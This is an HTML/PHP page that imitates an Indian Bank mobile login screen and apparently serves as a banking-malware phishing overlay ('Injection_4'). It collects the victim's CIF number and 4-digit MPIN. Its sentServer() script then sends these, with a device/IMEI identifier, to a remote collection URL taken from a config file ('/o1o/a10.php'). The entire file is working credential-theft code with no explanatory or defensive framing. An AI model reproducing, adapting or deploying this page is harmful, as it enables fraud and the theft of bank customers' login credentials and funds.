<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="in/com.infrasofttech.indianBank/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<center>

<center>
    <img src="data:image/png;base64,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">
</center><br>
<div class="border1" id="content_div">

    <form id="form">
        <ul>
            <li>
                <center>
                    <input id="login" name="field2" class="input" tabindex="0" placeholder="Enter Your CIF Number" size="16" maxlength="19" type="text">
                </center>
            </li>
            <li>
                <center>
                    <input id="password" name="field3" class="input" tabindex="0" placeholder="Enter 4 Digit MPIN" size="16" maxlength="19" autocomplete="OFF" type="password">
                    <script>
                        document.getElementById('password').onkeypress = function (e) {
                            return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                        }
                    </script>
                </center><br>
            </li>
        </ul>

        <center>
            <input value="Login" class="rc-button rc-button-submit" onClick="sentServer();" type="button">
        </center><br>


    </form>

</center><br>
</div>
<script>
	function sentServer()
	{
		
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value; 
	var pass = document.forms["form"].elements["password"].value; 

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|indianBank|"+login1+"|"+pass);
	}
	
	}
</script>
</body>
</html>
